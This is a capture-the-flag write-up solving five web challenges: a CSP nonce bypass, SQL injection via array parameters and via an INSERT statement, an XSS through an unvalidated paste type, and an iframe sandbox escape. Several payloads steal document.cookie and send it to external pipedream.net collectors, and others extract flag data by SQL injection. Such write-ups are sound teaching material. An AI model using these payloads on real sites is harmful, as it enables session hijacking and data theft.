## (Web) Babier CSP [107 pts]

The Babier CSP challenge is a simple CSP Bypass challenge.

```html
<script nonce=LRGWAXOY98Es0zz0QOVmag==>
elem.onclick = () => {
  location = "/?name=" + encodeURIComponent(["apple", "orange", "pineapple", "pear"][Math.floor(4 * Math.random())]);
}
</script>
```
If you check the source code, you can see that the nonce value of the script tag is set as above. I thought that the admin bot was also applying the nonce value as above.

```html
<script nonce=LRGWAXOY98Es0zz0QOVmag==>alert(1)</script>
<script nonce=LRGWAXOY98Es0zz0QOVmag==>location.href="https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net"%2bdocument.cookie</script>
```
The payload used is as above.

> dice{web_1s_a_stat3_0f_grac3_857720}

---
## (Web) Missing Flavortext [111 pts]

The Missing Flavortext challenge is a SQL Injection challenge that bypasses single quotas by using the features of express.js.
```javascript
if ([req.body.username, req.body.password].some(v => v.includes('\''))) {
  return res.redirect('/');
}
```
In the code above, single quota is filtered using the includes function. However, this can be bypassed by passing it as an array because it only verifies strings.
```txt
username=admin&password[]=1&password[]=' or '1'='1
The payload used is as above.
```
> dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}

---
## (Web) Web Utils [121 pts]

The Web Utils challenge is a challenge that triggers XSS using a vulnerability when receiving the req.body value.
```html
// view.html

<head>
  <script async>
    (async () => {
      const id = window.location.pathname.split('/')[2];
      if (! id) window.location = window.origin;
      const res = await fetch(`${window.origin}/api/data/${id}`);
      const { data, type } = await res.json();
      if (! data || ! type ) window.location = window.origin;
      if (type === 'link') return window.location = data;
      if (document.readyState !== "complete")
        await new Promise((r) => { window.addEventListener('load', r); });
      document.title = 'Paste';
      document.querySelector('div').textContent = data;
    })()
  </script>
</head>
```
It is view.html code, and if the type is link in the middle, you can see window.location as data. And if data contains a payload such as javascript:alert(1), you can trigger xss.

```javascript
// api.js
(skip)

module.exports = async (fastify) => {
  fastify.post('createLink', {
    handler: (req, rep) => {
      const uid = database.generateUid(8);
      const regex = new RegExp('^https?://');
      if (! regex.test(req.body.data))
        return rep
        
(skip)
```
However, if you look at the link creation logic, the value of req.body.data is verified with a regular expression. So, you can’t put xss payload in the link creation logic.
```javascript
// api.js
(skip)

fastify.post('createPaste', {
    handler: (req, rep) => {
      const uid = database.generateUid(8);
      database.addData({ type: 'paste', ...req.body, uid });
      rep
        .code(200)

(skip)
```
However, if you look at the logic that creates the Pate, there is no verification for req.body, which causes a vulnerability here. Using this, you can give type as link and data as xss payload.
```tzt
{"data":"javascript:alert(1)","type":"link"}
{"data":"javascript:location.href='https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/'%2bdocument.cookie","type":"link"}
```
The payload used is as above.

> dice{f1r5t_u53ful_j4v45cr1pt_r3d1r3ct}

---
## (Web) Build a Panel [130 pts]

The Build a Panel challenge is the challenge of reading flags using SQL Injection in the insert statement.
```javascript
app.get('/admin/debug/add_widget', async (req, res) => {
    const cookies = req.cookies;
    const queryParams = req.query;

    if(cookies['token'] && cookies['token'] == secret_token){
        query = `INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES ('${queryParams['panelid']}', '${queryParams['widgetname']}', '${queryParams['widgetdata']}');`;
        db.run(query, (err) => {
            if(err){
                console.log(err);
                res.send('something went wrong');
            }else{
                res.send('success!');
            }
        });
    }else{
        res.redirect('/');
    }
});
```
This is the logic of add_widget running on admin bot. When looking at the query, the input value is entered without any verification, so SQL Injection can be performed.

If we put our panelid in panelid and a query that reads flag in widgetname, a widget is created on our server, and the widget name contains FLAG. (panelid is stored in a cookie.
```txt
https://build-a-panel.dicec.tf/admin/debug/add_widget?panelid=pocas&widgetname=adfdaf&widgetdata=a'), ('pocas', (select flag from flag), '{"type":"pocas"}')--
```
The payload used is as above.

> dice{ch41n_ChAIn_aNd_m0Re_cHaIn}

---
## (Web) Web IDE [196 pts]

The Web IDE challenge is a challenge that bypasses iframe sandbox and triggers XSS.
- Scenario
  - We are using allow-scripts as an option for iframe, and the value we input is executed by the eval function in sandbox.html.
  - The path to the administrator’s cookie is /ide, so it is not easy to read the cookie. Because xss payload runs in /sandbox.html.
  - So, first you need to create a separate site and bypass the iframe sandbox.
  - If you bypass the iframe sandbox, you are not limited by sop, and you can freely execute xss payloads.
  - However, since xss payload is executed in /sandbox.html, it cannot read the admin cookie.
  - So, create an object using window.open("/ide"), and execute xss payload on the object to steal the cookie.
```html
<!doctype html>
<html>
  <head>
    <title>xss poc</title>
    <script>
        async function sendMessage() {
            // window open -> make file -> include it
            const cmd="[].constructor.constructor(\"(async () => {const res = await fetch('https://web-ide.dicec.tf/ide/save', {method:'POST', headers: {'Content-Type': 'application/javascript'}, body: 'const myWindow = window.open(\\\"/ide\\\"); (async (myWindow) => { await setTimeout( async() => {await fetch(`https://en20uuq0p0wxmkp.m.pipedream.net/?flag=${myWindow.document.cookie}`)}, 500) })(myWindow)'}); const file_name = await res.text(); const scr = document.createElement('script'); scr.src = `/ide/saves/${file_name}`; document.body.appendChild(scr);})()\")()"
            
            await new Promise((r) => { window.addEventListener(('load'), r); });
            document.querySelector('iframe')
              .contentWindow
              .postMessage(cmd, '*');  // IDE -> sandbox message
        };
    </script>
  </head>
  <body>
      <img src='x' onerror="sendMessage()" />
      <iframe name='hh' src="https://web-ide.dicec.tf/sandbox.html" frameborder="0"></iframe>
  </body>
</html>
```
The payload used is as above.

> dice{c0uldn7_f1nd_4_b4ckr0nym_f0r_1de}

---


